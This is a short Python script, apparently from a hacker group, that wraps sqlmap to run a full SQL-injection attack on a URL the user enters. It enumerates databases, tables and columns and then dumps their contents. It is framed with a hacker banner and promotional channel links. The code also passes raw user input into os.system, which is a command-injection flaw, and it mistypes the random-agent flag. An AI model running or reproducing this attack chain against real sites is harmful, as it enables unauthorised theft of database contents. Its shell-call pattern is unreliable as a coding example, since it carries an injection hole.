#!/usr/bin/python3

import os
print('''  /$$$$$$            /$$          /$$$$$$              /$$              
 /$$__  $$          | $$         /$$__  $$            | $$              
| $$  \__/  /$$$$$$ | $$        | $$  \ $$ /$$   /$$ /$$$$$$    /$$$$$$ 
|  $$$$$$  /$$__  $$| $$ /$$$$$$| $$$$$$$$| $$  | $$|_  $$_/   /$$__  $$
 \____  $$| $$  \ $$| $$|______/| $$__  $$| $$  | $$  | $$    | $$  \ $$
 /$$  \ $$| $$  | $$| $$        | $$  | $$| $$  | $$  | $$ /$$| $$  | $$
|  $$$$$$/|  $$$$$$$| $$        | $$  | $$|  $$$$$$/  |  $$$$/|  $$$$$$/
 \______/  \____  $$|__/        |__/  |__/ \______/    \___/   \______/ 
                | $$                                                    
                | $$                                                    
                |__/                                                    ''')
print (''' [+]Sql-Auto : ACS auto command SQLMAP V1.0                              
 [+]Author: Joker-Security (Anonymous-Algeria) 
 [+]My Channel:https://www.youtube.com/c/Professionalhacker25
 [+]Page FB:https://www.facebook.com/AnonymousPalestine.vip
 [+]Page FB:https://www.facebook.com/kali.linux.pentesting.tutorials''')

url = input('Enter url: ')
sqlmap1 = os.system('sqlmap --url  {} --dbs  ==randon-agent'.format (url))
dbs = input('Enter dbs: ')
sqlmap2 = os.system('sqlmap --url  {} -D {} --tables  ==randon-agent'.format (url,dbs))
tab = input('Enter tab: ')
sqlmap3 = os.system('sqlmap --url  {} -D {} -T {} --columns  ==randon-agent'.format (url,dbs,tab))
colm =input('Enter  colm: ')
sqlmap4 = os.system('sqlmap --url  {} -D {} -T {} -C {} --dump  ==randon-agent'.format (url,dbs,tab,colm))




